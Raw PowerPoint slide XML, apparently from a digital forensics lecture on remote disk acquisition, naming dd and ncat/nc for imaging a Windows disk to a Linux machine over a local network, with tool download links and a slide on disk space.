              <p:spPr>
                <a:xfrm>
                  <a:off x="2326612" y="192797"/>
                  <a:ext cx="594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745D203D-AA7B-0F29-F1BC-67818FB7E702}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="2202412" y="69317"/>
                <a:ext cx="322920" cy="321480"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="4" name="Ink 3">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{745D203D-AA7B-0F29-F1BC-67818FB7E702}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId7"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="2184772" y="51677"/>
                  <a:ext cx="358560" cy="357120"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="18" name="Group 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3ADB0E17-734B-35F4-0483-1C8BF150F094}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3133732" y="273437"/>
            <a:ext cx="5042880" cy="1345320"/>
            <a:chOff x="3133732" y="273437"/>
            <a:chExt cx="5042880" cy="1345320"/>
          </a:xfrm>
        </p:grpSpPr>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CD55B8C8-DFC8-D328-CFE5-E0EF67763EAD}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="3133732" y="273437"/>
                <a:ext cx="4656600" cy="1259280"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="8" name="Ink 7">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CD55B8C8-DFC8-D328-CFE5-E0EF67763EAD}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId9"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="3115732" y="255437"/>
                  <a:ext cx="4692240" cy="129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30E44AA8-E4AB-D84B-6D7C-19B58426C5FD}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7675492" y="1320677"/>
                <a:ext cx="162360" cy="298080"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="9" name="Ink 8">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30E44AA8-E4AB-D84B-6D7C-19B58426C5FD}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId11"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7657852" y="1302677"/>
                  <a:ext cx="19800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 name="Ink 15">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B55186A4-12A8-0F06-BD98-3C1C19E10B26}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7877452" y="892277"/>
                <a:ext cx="147600" cy="241560"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="16" name="Ink 15">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B55186A4-12A8-0F06-BD98-3C1C19E10B26}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId13"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7859812" y="874277"/>
                  <a:ext cx="18324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8D4E8F2B-787C-FA74-48A6-FB09DCB8EB0E}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7727692" y="765557"/>
                <a:ext cx="448920" cy="477360"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="17" name="Ink 16">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D4E8F2B-787C-FA74-48A6-FB09DCB8EB0E}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId15"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7710052" y="747557"/>
                  <a:ext cx="484560" cy="513000"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="21" name="Group 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E695CFF-1D2C-4273-1C31-6D7D48FECC1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1822252" y="718757"/>
            <a:ext cx="5547600" cy="1025280"/>
            <a:chOff x="1822252" y="718757"/>
            <a:chExt cx="5547600" cy="1025280"/>
          </a:xfrm>
        </p:grpSpPr>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89453CD5-A27C-BEEA-1C3C-25033544C231}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1894612" y="859157"/>
                <a:ext cx="5475240" cy="884880"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="19" name="Ink 18">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89453CD5-A27C-BEEA-1C3C-25033544C231}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId17"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1876972" y="841157"/>
                  <a:ext cx="5510880" cy="920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9F38F2D8-6546-53E9-AA19-8B251B406328}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1822252" y="718757"/>
                <a:ext cx="123840" cy="248400"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="20" name="Ink 19">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F38F2D8-6546-53E9-AA19-8B251B406328}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId19"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1804252" y="700757"/>
                  <a:ext cx="159480" cy="284040"/>
                </a:xfrm>
                <a:prstGeom prst="rect">
                  <a:avLst/>
                </a:prstGeom>
              </p:spPr>
            </p:pic>
          </mc:Fallback>
        </mc:AlternateContent>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="24" name="Group 23">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{760F4072-955C-7D20-F667-223D0A0BB030}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2609572" y="577637"/>
            <a:ext cx="322200" cy="517680"/>
            <a:chOff x="2609572" y="577637"/>
            <a:chExt cx="322200" cy="517680"/>
          </a:xfrm>
        </p:grpSpPr>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8975A4BB-7325-6AFE-302E-B6E9D7FF22F8}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="2719372" y="758717"/>
                <a:ext cx="158760" cy="268200"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="22" name="Ink 21">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8975A4BB-7325-6AFE-302E-B6E9D7FF22F8}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId21"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="2701732" y="741077"/>
                  <a:ext cx="19440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390D2FF0-33B9-0789-38EE-9B33CFC3C6EC}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="2609572" y="577637"/>
                <a:ext cx="322200" cy="517680"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="23" name="Ink 22">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{390D2FF0-33B9-0789-38EE-9B33CFC3C6EC}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId23"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="2591932" y="559997"/>
                  <a:ext cx="357840" cy="553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5" name="Ink 24">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{827DF6C7-4049-53AB-E939-22D611165851}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="11503732" y="3296357"/>
              <a:ext cx="360" cy="1800"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="25" name="Ink 24">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{827DF6C7-4049-53AB-E939-22D611165851}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId25"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11486092" y="3278717"/>
                <a:ext cx="360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3D27415F-F638-7958-0F63-39073B0D9045}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="11761852" y="3970277"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="26" name="Ink 25">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3D27415F-F638-7958-0F63-39073B0D9045}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId27"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11744212" y="395227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5C4485D2-763A-154F-9E32-3A29273361A0}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="11660332" y="4188797"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="27" name="Ink 26">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5C4485D2-763A-154F-9E32-3A29273361A0}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId27"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="11642692" y="4170797"/>
                <a:ext cx="36000" cy="36000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="951356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F07C5-17BD-B3F7-8B25-E679CB0A941C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote Disk Acquisition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5DCA4F57-C286-F1BF-F183-0437F580EFFB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Demo only</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2698180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738E3A-FAFE-CD5C-4FDA-F506EE834B24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote disk acquisition scenario </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="Computer screen with Windows logo - Free technology icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{638A7BF9-FED2-22E5-B45F-9F753A5C08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2559316"/>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inux - Download free icons">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DBBE743-EB9C-E9A1-A918-7AD451591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9640" y="2559316"/>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5" name="Arrow: Right 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C22EBE8A-F7CE-ACB6-8661-078C7709745B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4511077" y="3092861"/>
            <a:ext cx="2364509" cy="36945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39D7015-2EBD-F0D9-1FD9-A971CC9A7043}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4845433" y="2792455"/>
            <a:ext cx="1579278" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dd </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>command</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Right Brace 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C595A15D-E36D-9D1B-F8D2-BF1B33979534}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5532325" y="-774722"/>
            <a:ext cx="322011" cy="5984114"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575">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 name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{009B10B2-E018-A3B0-6253-72F477CDBDDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4571113" y="1690688"/>
            <a:ext cx="2940741" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Must</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> be in the same network</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DA110A7-8429-AB0A-52E0-2DA911E92E45}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="5064390"/>
            <a:ext cx="5035933" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ncat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://nmap.org/download</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>http://www.chrysocome.net/downloads/dd-0.5.zip</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54D51B9C-CB13-B7F5-F54B-0809D36C895E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8311659" y="4972950"/>
            <a:ext cx="747458" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="OCRB" panose="020B0609020202020204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7835195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690B4-AC3E-F354-632F-2FF43DCD3103}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Do you have enough disk space in Linux to save the acquired Windows image?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35C8AB96-22D5-8F0F-799F-036FC7F55446}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="649267" y="2683414"/>
            <a:ext cx="5446733" cy="2183226"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
